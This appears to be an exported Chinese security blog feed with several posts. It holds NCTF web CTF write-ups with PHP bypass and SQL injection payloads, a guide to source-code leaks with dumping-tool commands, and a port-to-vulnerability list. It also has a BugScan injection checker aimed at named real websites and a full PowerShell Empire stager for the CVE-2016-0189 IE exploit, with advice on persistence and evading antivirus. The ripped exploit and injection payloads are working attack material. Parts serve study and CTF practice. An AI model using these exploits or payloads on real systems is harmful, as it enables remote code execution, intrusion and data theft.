&quot;please input pass!&quot;;&#125;?&gt; strcmp() 函数比较两个字符串。依据提示我们需要构造pass与pass1相等才行，但是我又不知道pass1，但是strcmp()比较，若相等返回0！但是null和0是等价的，所以我们让其返回null即可。构造：pass[]=hack 把这个post上去就行 flag:nctf{strcmp_is_n0t_3afe} 起名字真难审计！ 123456789101112131415161718192021&lt;?php function noother_says_correct($number)&#123; $one = ord(&apos;1&apos;);//ord() 函数返回字符串的首个字符的 ASCII 值。 $nine = ord(&apos;9&apos;); for ($i = 0; $i &lt; strlen($number); $i++) &#123; $digit = ord($number&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; return false; &#125; &#125; return $number == &apos;54975581388&apos;;&#125;$flag=&apos;*******&apos;;if(noother_says_correct($_GET[&apos;key&apos;])) echo $flag;else echo &apos;access denied&apos;;?&gt; 要求：id中的字符串不能有数字，而想得到flag又要进去的是要数字 构造：54975581388的16进制 0xccccccccc 提交得到flag:nctf{follow_your_dream} 密码重置其中涉及了URL编码和base64编码，burp抓包修改成admin就行 nctf{reset_password_often_have_vuln} .php反序列化审计！ 12345678910111213141516171819202122232425&lt;?phpclass just4fun &#123; var $enter; var $secret;&#125;if (isset($_GET[&apos;pass&apos;])) &#123; $pass = $_GET[&apos;pass&apos;]; if(get_magic_quotes_gpc())&#123; $pass=stripslashes($pass); &#125; $o = unserialize($pass); if ($o) &#123; $o-&gt;secret = &quot;*&quot;; if ($o-&gt;secret === $o-&gt;enter) echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret; else echo &quot;Oh no... You can&apos;t fool me&quot;; &#125; else echo &quot;are you trolling?&quot;;&#125;?&gt; 题目的意思就是一个序列化过后的字符串与类中的变量始终保持相同，可以想到引用a=&amp;b （这可以当成一个专题讲讲） 1.php的内容 123456789101112131415161718192021&lt;?php class just4fun &#123; var $enter; var $secret; function just4fun() &#123; $this-&gt;enter=&amp;$this-&gt;secret; &#125; &#125; echo serialize(new just4fun()); ?&gt; 执行一下 123➜ Desktop php 1.phpO:8:&quot;just4fun&quot;:2:&#123;s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;&#125; 构造： http://115.28.150.176/php1/index.php?pass=O:8:”just4fun”:2:{s:5:”enter”;N;s:6:”secret”;R:2;} 得到flag nctf{serialize_and_unserialize} sql injection 4审计！ 1234567891011121314151617181920212223&lt;!--#GOAL: login as admin,then get the flag;error_reporting(0);require &apos;db.inc.php&apos;;function clean($str)&#123; if(get_magic_quotes_gpc())&#123;//当 magic_quotes_gpc 打开时，所有的 ’ (单引号), ” (双引号), \ (反斜线) and 空字符会自动转为含有反斜线的转义字符 $str=stripslashes($str);//与stripslashes()搭配使用，此函数是删除所有的\的 &#125; return htmlentities($str, ENT_QUOTES);//htmlentities($str, ENT_QUOTES)是指编码所有的双引号和单引号&#125;$username = @clean((string)$_GET[&apos;username&apos;]);$password = @clean((string)$_GET[&apos;password&apos;]);$query=&apos;SELECT * FROM users WHERE name=\&apos;&apos;.$username.&apos;\&apos; AND pass=\&apos;&apos;.$password.&apos;\&apos;;&apos;;$result=mysql_query($query);if(!$result || mysql_num_rows($result) &lt; 1)&#123; die(&apos;Invalid password!&apos;);&#125;echo $flag;--&gt; 重点在于： 在这里由于’被转编码，所以可以使用\转义 $query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;; 构造：http://chinalover.sinaapp.com/web15/index.php?username=admin\&amp;password=%20or%201%23 插入后大致的sql语句为：SELECT * FROM users WHERE name=’ admin\’ AND pass=’ or 1#’; 综合题zh个很有意思，首先是一个jsfuck，不用解码，直接执行就可以 执行后得到：1bc29b36f623ba82aaf6724fd3b16718.php 打开发现不是这回事 又看提示，想到bash的一些相关，再看这个网页的header发现tip “history of bash” bash_history是用来存放历史记录的，所以我们就访问 http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/.bash_history 又得到提示：zip -r flagbak.zip ./* 那么就访问这个： http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip 下载解压得到flag is:nctf{bash_history_means_what} 有源码给了题目的源码，可以自己搭建环境来尝试 https://github.com/otakekumi/NUPT_Challenges/tree/master/WEB SQL注入2审计！ 123456789101112131415&lt;?phpif($_POST[user] &amp;&amp; $_POST[pass]) &#123; mysql_connect(SAE_MYSQL_HOST_M . &apos;:&apos; . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS); mysql_select_db(SAE_MYSQL_DB); $user = $_POST[user]; $pass = md5($_POST[pass]); $query = @mysql_fetch_array(mysql_query(&quot;select pw from ctf where user=&apos;$user&apos;&quot;)); if (($query[pw]) &amp;&amp; (!strcasecmp($pass, $query[pw]))) &#123; echo &quot;&lt;p&gt;Logged in! Key: ntcf&#123;**************&#125; &lt;/p&gt;&quot;; &#125; else &#123; echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;); &#125;&#125;?&gt; strcasecmp是不分大小比较，这样只要得到密码md5值相同即可，提示已经说了用union所以我们来构造payload： username填写’ union select md5(1)# password填写1 得flag：ntcf{union_select_is_wtf} 剩余的题目不建议小白来做，想做的看这个链接 http://blog.csdn.net/qq_31481187/article/details/52097287?locationNum=9 或者： https://www.40huo.cn/blog/nctf-writeup.html （ps：东西太多写不动了。。。） 总结：可以写点base64、base32、url编码解码、文本与16进制转换的小工具。&lt;&lt;&lt;可以练手，但是hackbar带全了和burp]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[常见Web源码泄露总结]]></title>
      <url>%2F2017%2F01%2F25%2F%E5%B8%B8%E8%A7%81Web%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2%E6%80%BB%E7%BB%93%2F</url>
      <content type="text"><![CDATA[背景本文主要是记录一下常见的源码泄漏问题，这些经常在web渗透测试以及CTF中出现。 源码泄漏分类.hg源码泄漏漏洞成因：hg init的时候会生成.hg e.g.http://www.example.com/.hg/ 漏洞利用：工具：dvcs-ripper 1rip-hg.pl -v -u http://www.example.com/.hg/ .git源码泄漏漏洞成因：在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。 e.g. http://www.example.com/.git/config 漏洞利用：工具： GitHack 1GitHack.py http://www.example.com/.git/ dvcs-ripper 1rip-git.pl -v -u http://www.example.com/.git/ .DS_Store文件泄漏漏洞成因:在发布代码时未删除文件夹中隐藏的.DS_store，被发现后，获取了敏感的文件名等信息。 漏洞利用:http://www.example.com/.ds_store 注意路径检查 网站备份压缩文件 在网站的使用过程中，往往需要对网站中的文件进行修改、升级。此时就需要对网站整站或者其中某一页面进行备份。当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站web目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。 工具： ds_store_exp 1python ds_store_exp.py http://www.example.com/.DS_Store 漏洞成因及危害:该漏洞的成因主要有以下两种： 服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。 编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下。 漏洞检测该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。 123456789101112131415.rar.zip.7z.tar.gz.bak.swp.txt.html 解决方案1find . -name ".DS_Store" -print0 | xargs -0 rm -rf #递归删除".DS_Store"文件 SVN导致文件泄露简介：Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。 Subversion使用服务端—客户端的结构，当然服务端与客户端可以都运行在同一台服务器上。在服务端是存放着所有受控制数据的Subversion仓库，另一端是Subversion的客户端程序，管理着受控数据的一部分在本地的映射（称为“工作副本”）。在这两端之间，是通过各种仓库存取层（Repository Access，简称RA）的多条通道进行访问的。这些通道中，可以通过不同的网络协议，例如HTTP、SSH等，或本地文件的方式来对仓库进行操作。 e.g.http://vote.lz.taobao.com/admin/scripts/fckeditor.266/editor/.svn/entries 漏洞利用:工具： dvcs-ripper 1rip-svn.pl -v -u http://www.example.com/.svn/ Seay-Svn WEB-INF/web.xml泄露简介：WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。 WEB-INF主要包含一下文件或目录： /WEB-INF/web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。/WEB-INF/classes/：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中/WEB-INF/lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件/WEB-INF/src/：源码目录，按照包名结构放置各个java文件。/WEB-INF/database.properties：数据库配置文件 漏洞成因：通常一些web应用我们会使用多个web服务器搭配使用，解决其中的一个web服务器的性能缺陷以及做均衡负载的优点和完成一些分层结构的安全策略等。在使用这种架构的时候，由于对静态资源的目录或文件的映射配置不当，可能会引发一些的安全问题，导致web.xml等文件能够被读取。 漏洞检测以及利用方法：通过找到web.xml文件，推断class文件的路径，最后直接class文件，在通过反编译class文件，得到网站源码。 一般情况，jsp引擎默认都是禁止访问WEB-INF目录的，Nginx 配合Tomcat做均衡负载或集群等情况时，问题原因其实很简单，Nginx不会去考虑配置其他类型引擎（Nginx不是jsp引擎）导致的安全问题而引入到自身的安全规范中来（这样耦合性太高了），修改Nginx配置文件禁止访问WEB-INF目录就好了： location ~ ^/WEB-INF/* { deny all; } 或者return 404; 或者其他！ CVS泄漏漏洞利用测试的目录 123http://url/CVS/Root 返回根信息http://url/CVS/Entries 返回所有文件的结构 取回源码的命令 1bk clone http://url/name dir 这个命令的意思就是把远端一个名为name的repo clone到本地名为dir的目录下。 查看所有的改变的命令，转到download的目录 1bk changes Bazaar/bzr漏洞利用工具： dvcs-ripper 1rip-bzr.pl -v -u http://www.example.com/.bzr/ 神器Bitkeeper) weakfilescan 参考https://zhuanlan.zhihu.com/p/21296806?refer=Anonymous0 http://www.s2.sshz.org/post/source-code-leak/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PORT=>服务/漏洞]]></title>
      <url>%2F2017%2F01%2F24%2FPORT-%E6%9C%8D%E5%8A%A1-%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[范围：0-65535固定端口：0-1023 1024保留动态端口：1024-65535 常用端口21：FTP(爆破) 22：SSH(爆破) 23：Telnet(爆破) 25：SMTP 53：DNS（UDP） 69：TFTP（cisco，类似FTP） 79：Finger 80：HTTP 110：POP3 111：RPC 远程过程调用 113：windows 验证服务 119：NNTP 网络新闻组传输协议 135：RPC 远程过程调用 137：NetBIOS 139：windows文件和打印机共享，Unix中的samba服务 161：SNMP 简单网络管理协议 389：LDAP 443：HTTPS 445：SMB 1080：socks代理服务 2082/2083 cpanel主机管理系统登陆 (国外用较多) 2222 DA虚拟主机管理系统登陆 (国外用较多) 2601,2604：zebra路由，默认密码zebra 3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了 3312/3311 kangle主机管理系统登陆 3389:远程桌面 4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网 5900：vnc 6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网 7001,7002 WebLogic默认弱口令，反序列 8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上 8080：用户www代理服务,tomcat/WDCP主机管理系统，默认弱口令 8080,8089,9090 JBOSS 8083 Vestacp主机管理系统 （国外用较多） 8649 ganglia 8888 amh/LuManager 主机管理系统默认端口 9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞 10000 Virtualmin/Webmin 服务器虚拟主机管理系统 11211 memcache未授权访问 27017,27018 Mongodb未授权访问 28017 mongodb统计页面 50000 SAP命令执行 50070,50030 hadoop默认端口未授权访问 木马病毒5554：worm.Sasser病毒利用端口7626：冰河病毒8011：WAY2.4病毒7306：Netspy3.0病毒1024：YAI病毒 中间件7001,7002：weblogic9080：webshpere应用程序9090：webshpere管理工具8080：tomcat默认端口Jboss通常占用的端口是1098，1099，4444，4445，8080，8009，8083，8093，默认为8080 数据库3306：mysql1433：mssqlserver1434：sqlserver monitor1521：oracle:(iSqlPlus Port:5560,7778)5432：PostgreSQL1158：ORACLE EMCTL8080：Oracle XDB2100：Oracle XDB FTP 特殊服务（漏洞）443：SSL心脏滴血 512,513,514：Rsync未授权访问 873：Rsync未授权访问 1025,111 NFS 2375：docker remote api漏洞 50000：SAP命令执行 5984：CouchDB http://xxx:5984/_utils/ 6379：redis未授权 7001,7002：WebLogic 默认弱口令，反序列化 9200,9300：elasticsearch未授权访问 11211：memcache未授权访问 27017,27018：Mongodb 未授权访问28017：mongodb统计页面]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[BugScan插件编写]]></title>
      <url>%2F2017%2F01%2F22%2FBugScan%E6%8F%92%E4%BB%B6%E7%BC%96%E5%86%99%2F</url>
      <content type="text"><![CDATA[最近四叶草又开始招收实习了，所以某个妹子就投了简历。不久四叶草发来一个题目要妹子完成。So？这意味着什么，这意味着一个泡妹子的好时机来了啊。哈哈哈…… 下面就让我们看看这个题目： 某通用平台被曝出有一处高危注入，以下为详情： 1http://www.exploit.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1 userName处为一处报错注入， 请使用python编写一个通用脚本检测该处注入点(可使用任何python库)，要求测试该脚本必须使用多个目标站点。以下为两个测试站点（请勿做除测试之外的任何危险动作） 12http://www.jmsyzx.com/http://www.globechildren.com/ 哎呦，不限制python库，一个通用脚本。刚跟室友开黑了一下守望先锋（挺好玩儿的，有兴趣一起啊）的我刚看也是一脸懵逼，总之刚开始想的太多了，但其实也就是一个插件的事情（还是range一棒打醒我，所以以后还是干完正事再开黑）。 看了一下是mssql数据库，并且是报错注入。我们可以手工构造看数据库类型： 1http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=@@version-- 也可以sqlmap跑一下看看： 1234567891011121314151617181920[22:07:32] [INFO] resuming back-end DBMS &apos;microsoft sql server&apos;[22:07:32] [INFO] testing connection to the target URLsqlmap resumed the following injection point(s) from stored session:---Parameter: userName (GET)Type: error-basedTitle: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clausePayload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; AND 2390=CONVERT(INT,(SELECT CHAR(113)+CHAR(107)+CHAR(98)+CHAR(113)+CHAR(113)+(SELECT (CASE WHEN (2390=2390) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(98)+CHAR(112)+CHAR(118)+CHAR(113))) AND &apos;nTAv&apos;=&apos;nTAvType: stacked queriesTitle: Microsoft SQL Server/Sybase stacked queries (comment)Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos;;WAITFOR DELAY &apos;0:0:5&apos;--Type: AND/OR time-based blindTitle: Microsoft SQL Server/Sybase time-based blind (comment)Payload: ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1&apos; WAITFOR DELAY &apos;0:0:5&apos;-----[22:07:33] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2008 R2 or 7web application technology: ASP.NET, Microsoft IIS 7.5back-end DBMS: Microsoft SQL Server 2005[22:07:33] [INFO] fetched data logged to text files under &apos;C:\Users\ZEROYU\.sqlmap\output\www.jmsyzx.com&apos; 别多看看那个GET就行了，GET最简单了。我们就抓住报错跟打印MD5这两点就行了。 打印MD5呢，mssql有两种方式： 1231.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))--2.http://www.jmsyzx.com/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))-- 直接上我写的脚本： 12345678910111213141516171819202122#!/usr/bin/evn python#-*-:coding:utf-8 -*-"""POC Name : 泡妹专享Author : zeroyumail : zeroyu.xyz@gmail.com"""import hackhttpimport timedef assign(service, arg): if service == 'fingerprint.girl': return True, argdef audit(arg): payload = "/livefiles/pages/inner/userlist.aspx?ModuleType=Friends&amp;RelatedUserType=Friends&amp;UserModuleClientID=ctl00_ctl00_TemplateHolder_ContentHolder_ctl06&amp;userName=1%27%20and%201=sys.fn_varbintohexstr(hashbytes(%27MD5%27,%271234%27))--" url = arg + payload code, head, res, errcode, _ = hackhttp.http(url) time.sleep(1) if code == 500 and '81dc9bdb52d04dc20036dbd8313ed055' in res: security_hole(url)if __name__=='__main__': from dummy import * audit(assign('fingerprint.girl','http://www.jmsyzx.com/')[1]) 是不是想问我hackhttp是个什么库，看文档去。 好，今天妹子就泡到这儿。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[POWERSHELL EMPIRE + CVE-2016-0189 = PROFIT]]></title>
      <url>%2F2017%2F01%2F22%2FPOWERSHELL-EMPIRE-CVE-2016-0189-PROFIT%2F</url>
      <content type="text"><![CDATA[​ Powershell Empire 是我们在渗透目标用户时一直都很喜欢的工具之一，虽然我们通常都是用Metaspolit和Empire来一起完成工作，使浏览器漏洞和经验结合在Empire中。在最近的一次测试中我们没有选择去使用MSF，相反我们和一个新的“经验丰富”的Empire一起利用CVE-2016-0189（也就是vbscrupt_godmode）其攻击使用IE9—11的用户。Empire是近6个月来我们首选的使用并且最近开始打造漏洞工具箱。如果成功，powershell将会登录并通过一个代理链接到Empire。重要的是硬盘上不会留下任何信息。from lib.common import helpersclass Stager: def __init__(self, mainMenu, params=[]): self.info = &#123; 'Name': 'MS16-051 IE RCE', 'Author': ['www.cgsec.co.uk'], 'Description': ('Leverages MS16-051 to execute powershell in unpatched browsers. This is a file-less vector which works on IE9/10/11 and all versions of Windows'), 'Comments': [ 'Target will have to open link with vulnerable version of IE.' ] &#125; # any options needed by the stager, settable during runtime self.options = &#123; # format: # value_name : &#123;description, required, default_value&#125; 'Listener' : &#123; 'Description' : 'Listener to generate stager for.', 'Required' : True, 'Value' : '' &#125;, 'StagerRetries' : &#123; 'Description' : 'Times for the stager to retry connecting.', 'Required' : False, 'Value' : '0' &#125;, 'OutFile' : &#123; 'Description' : 'File to output HTML to, otherwise displayed on the screen.', 'Required' : True, 'Value' : '' &#125;, 'Base64' : &#123; 'Description' : 'Switch. Base64 encode the powershell output.', 'Required' : True, 'Value' : 'True' &#125;, 'UserAgent' : &#123; 'Description' : 'User-agent string to use for the staging request (default, none, or other).', 'Required' : False, 'Value' : 'default' &#125;, 'Proxy' : &#123; 'Description' : 'Proxy to use for request (default, none, or other).', 'Required' : False, 'Value' : 'default' &#125;, 'ProxyCreds' : &#123; 'Description' : 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).', 'Required' : False, 'Value' : 'default' &#125; &#125; # save off a copy of the mainMenu object to access external functionality # like listeners/agent handlers/etc. self.mainMenu = mainMenu for param in params: # parameter format is [Name, Value] option, value = param if option in self.options: self.options[option]['Value'] = value def generate(self): # extract all of our options listenerName = self.options['Listener']['Value'] base64 = self.options['Base64']['Value'] userAgent = self.options['UserAgent']['Value'] proxy = self.options['Proxy']['Value'] proxyCreds = self.options['ProxyCreds']['Value'] stagerRetries = self.options['StagerRetries']['Value'] encode = False if base64.lower() == "true": encode = True # generate the launcher code launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=encode, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries) if launcher == "": print helpers.color("[!] Error in launcher command generation.") return "" else: code = "&lt;html&gt;\n" code += "&lt;head&gt;\n" code += "&lt;meta http-equiv=\"x-ua-compatible\" content=\"IE=10\"&gt;\n" code += "&lt;/head&gt;\n" code += "&lt;body&gt;\n" code += " &lt;script type=\"text/vbscript\"&gt;\n" code += " Dim aw\n" code += " Dim plunge(32)\n" code += " Dim y(32)\n" code += " prefix = \"%u4141%u4141\"\n" code += " d = prefix &amp; \"%u0016%u4141%u4141%u4141%u4242%u4242\"\n" code += " b = String(64000, \"D\")\n" code += " c = d &amp; b\n" code += " x = UnEscape(c)\n" code += " \n" code += " Class ArrayWrapper\n" code += " Dim A()\n" code += " Private Sub Class_Initialize\n" code += " ReDim Preserve A(1, 2000)\n" code += " End Sub\n" code += " \n" code += " Public Sub Resize()\n" code += " ReDim Preserve A(1, 1)\n" code += " End Sub\n" code += " End Class\n" code += " \n" code += " Class Dummy\n" code += " End Class\n" code += " \n" code += " Function getAddr (arg1, s)\n" code += " aw = Null\n" code += " Set aw = New ArrayWrapper\n" code += " \n" code += " For i = 0 To 32\n" code += " Set plunge(i) = s\n" code += " Next\n" code += " \n" code += " Set aw.A(arg1, 2) = s\n" code += " \n" code += " Dim addr\n" code += " Dim i\n" code += " For i = 0 To 31\n" code += " If Asc(Mid(y(i), 3, 1)) = VarType(s) Then\n" code += " addr = strToInt(Mid(y(i), 3 + 4, 2))\n" code += " End If\n" code += " y(i) = Null\n" code += " Next\n" code += " \n" code += " If addr = Null Then\n" code += " document.location.href = document.location.href\n" code += " Return\n" code += " End If\n" code += " getAddr = addr\n" code += " End Function\n" code += " \n" code += " Function leakMem (arg1, addr)\n" code += " d = prefix &amp; \"%u0008%u4141%u4141%u4141\"\n" code += " c = d &amp; intToStr(addr) &amp; b\n" code += " x = UnEscape(c)\n" code += " \n" code += " aw = Null\n" code += " Set aw = New ArrayWrapper\n" code += " \n" code += " Dim o\n" code += " o = aw.A(arg1, 2)\n" code += " \n" code += " leakMem = o\n" code += " End Function\n" code += " \n" code += " Sub overwrite (arg1, addr)\n" code += " d = prefix &amp; \"%u400C%u0000%u0000%u0000\"\n" code += " c = d &amp; intToStr(addr) &amp; b\n" code += " x = UnEscape(c)\n" code += " \n" code += " aw = Null\n" code += " Set aw = New ArrayWrapper\n" code += " \n" code += " \n" code += " aw.A(arg1, 2) = CSng(0)\n" code += " End Sub\n" code += " \n" code += " Function exploit (arg1)\n" code += " Dim addr\n" code += " Dim csession\n" code += " Dim olescript\n" code += " Dim mem\n" code += " \n" code += " \n" code += " Set dm = New Dummy\n" code += " \n" code += " addr = getAddr(arg1, dm)\n" code += " \n" code += " mem = leakMem(arg1, addr + 8)\n" code += " csession = strToInt(Mid(mem, 3, 2))\n" code += " \n" code += " mem = leakMem(arg1, csession + 4)\n" code += " olescript = strToInt(Mid(mem, 1, 2))\n" code += " overwrite arg1, olescript + &amp;H174\n" code += " Set Object = CreateObject(\"Wscript.Shell\")\n" code += " Object.run(\"" code += launcher + "\")\n" code += " End Function\n" code += " \n" code += " Function triggerBug\n" code += " aw.Resize()\n" code += " Dim i\n" code += " For i = 0 To 32\n" code += " ' 24000x2 + 6 = 48006 bytes\n" code += " y(i) = Mid(x, 1, 24000)\n" code += " Next\n" code += " End Function\n" code += " &lt;/script&gt;\n" code += " \n" code += " &lt;script type=\"text/javascript\"&gt;\n" code += " function strToInt(s)\n" code += " &#123;\n" code += " return s.charCodeAt(0) | (s.charCodeAt(1) &lt;&lt; 16);\n" code += " &#125;\n" code += " function intToStr(x)\n" code += " &#123;\n" code += " return String.fromCharCode(x &amp; 0xffff) + String.fromCharCode(x &gt;&gt; 16);\n" code += " &#125;\n" code += " var o;\n" code += " o = &#123;\"valueOf\": function () &#123;\n" code += " triggerBug();\n" code += " return 1;\n" code += " &#125;&#125;;\n" code += " setTimeout(function() &#123;exploit(o);&#125;, 50);\n" code += " &lt;/script&gt;\n" code += "&lt;/body&gt;\n" code += "&lt;/html&gt;" return code ms16.py 首先我们可以从Github获取Empire 现在我们已经下载了Empire，接下来我们要安装apache2以便于我们把索引页面直接放到/var/www/html路径下。这一步是可选的，因为大多数人都想改变输出位置，模糊它来逃避杀毒引擎或者类似的产品。 接下来该添加我们的新规则了。这需要将脚本放在/lib/stagers下并且运行Empire的install.sh脚本去添加并运行它。如果你的运行在Ubuntu环境中，你可能要在运行这些脚本之前去安装pip。 现在我们已经准备好并要第一次去启动Empire了。如果一切都顺利的话我们应该可以去使用我们添加的ms16脚本、设置我们的输出文件到/var/www/html/index.html并且放置直接目标到其中。更高级的用户可能想要去设置一些稍微复杂的到服务中来利用不同客户或不同的向量来混淆视听，这些就已经超出本文要描述的范围了。 我个人更偏向于设置443端口的监听以期bypass一些防火墙并逃避一些检测机制。 现在去生成我们的恶意HTML 现在当你的服务被某个使用带有相关漏洞浏览器的用户浏览的时候，这个攻击载荷将被触发同时你将看到一个新的代理在Empire中。使用持久性模块创建任务通常是个好注意，相似的也可以确保你不因为重新启动而丢失权限。这些可以通过设置自动运行的代理从而设置为自动运行一个新的客户端连接。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[XSS姿势——文件上传XSS]]></title>
      <url>%2F2017%2F01%2F22%2FXSS%E5%A7%BF%E5%8A%BF%E2%80%94%E2%80%94%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0XSS%2F</url>
      <content type="text"><![CDATA[0x01 简单介绍 一个文件上传点是执行XSS应用程序的绝佳机会。很多网站都有用户权限上传个人资料图片的上传点，你有很多机会找到相关漏洞。如果碰巧是一个self XSS，你可以看看这篇文章。 0x02 实例分析 首先基本上我们都可以找到类似下面的一个攻击入口点，我觉得这个并不难。 姿势一：文件名方式文件名本身可能会反映在页面所以一个带有XSS命名的文件便可以起到攻击作用。 虽然我没有准备靶场，但是你可以选择在W3Schools练习这种XSS 。 姿势二：Metadata使用exiftool这个工具可以通过改变EXIF metadata进而一定几率引起某处反射： 例如： 姿势三：Content如果应用允许上传SVG格式的文件（其实就是一个图像类型的），那么带有以下content的文件可以被用来触发XSS： 一个 PoC用来验证。你可以通过访问brutelogic.com.br/poc.svg看到效果 姿势四：Source建立一个携带有JavaScript payload的GIF图像用作一个脚本的源。这对绕过CSP（内容安全策略）保护“script-src ‘self’”（即不允许使用示例的这种xss方式进行攻击alert(1)）是很有用的，但前提是我们能够成功地在相同的域注入，如下所示。 要创建这样的图像需要这个作为content 和 name，并使用.gif扩展名： 这个GIF的图片头——GIF89a，作为alert function的变量分配给alert function。但是他们之间，还有一个被标注的XSS变量用来防止图片被恢复为text/HTML MIME文件类型，因此只需发送一个对这个文件的请求payload 就可以被执行。 正如我们下面看到的，文件类unix命令和PHP函数中的exif_imagetype（）和getimagesize（）会将其识别为一个GIF文件。所以如果一个应用程序仅仅是使用这些方式验证是否是一个图像，那么该文件将可以上传成功（但可能在上传后被杀掉）。 0x03 最后 如果你想知道更多的有其标志性ASCII字符可以用于一个javascript变量赋值的文件类型，看我随后的文章。 也有很多比较详细的使用XSS和图像文件相结合绕过图形处理函数库过滤的例子。这方面的一个很好的例子是here 原文链接：http://brutelogic.com.br/blog/]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[PNG文件中的LSB隐写]]></title>
      <url>%2F2017%2F01%2F22%2FPNG%E6%96%87%E4%BB%B6%E4%B8%AD%E7%9A%84LSB%E9%9A%90%E5%86%99%2F</url>
      <content type="text"><![CDATA[看到MottoIn的一篇文章时关于LSB隐写的，正好赶上中秋攒了一堆月饼没处放，就想由此出个题送送月饼。 环境：win10 python27 lsb脚本使用了https://github.com/cyberinc/cloacked-pixel 在使用之前需要几个python包，主要说下win10下如何安装这些包 1.PIL 这个包你按廖雪峰官网上的方法可能安装不上，所以我给出我自己的解决办法： 到https://pypi.python.org/pypi/Pillow/2.7.0找到exe安装包双击 主要是PIL官方编译包有bug，所以最好下载第三方组织编译包，强烈推荐pillow的确好用 2.matplotlib 这个包的安装直接参考官方网站的方法，注意一步一步来。 123456python -m pip install --upgrade pippython -m pip install --upgrade numpypython -m pip install --upgrade pytzpython -m pip install --upgrade pyparsingpython -m pip install --upgrade cyclerpython -m pip install --upgrade matplotlib 这就ok了，很简单。 接下来按照MottoIn这个玩就好了。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[win10只有edge可以打开网页]]></title>
      <url>%2F2017%2F01%2F22%2Fwin10%E5%8F%AA%E6%9C%89edge%E5%8F%AF%E4%BB%A5%E6%89%93%E5%BC%80%E7%BD%91%E9%A1%B5%2F</url>
      <content type="text"><![CDATA[按住win+x 然后选择“命令提示符（管理员）” 输入 netsh winsock reset 重启就好了。。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[北京之行的感悟]]></title>
      <url>%2F2017%2F01%2F22%2F%E5%8C%97%E4%BA%AC%E4%B9%8B%E8%A1%8C%E7%9A%84%E6%84%9F%E6%82%9F%2F</url>
